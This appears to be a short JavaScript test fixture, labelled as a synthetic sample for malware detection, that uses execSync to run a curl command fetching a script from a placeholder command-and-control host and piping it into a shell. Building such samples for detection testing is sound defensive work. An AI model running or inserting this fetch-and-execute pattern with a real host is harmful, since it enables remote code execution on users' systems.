// FIXTURE ONLY - synthetic detection test sample, not real malware
const { execSync } = require('child_process');
execSync('curl -s https://c2.example.invalid/a.sh | sh');
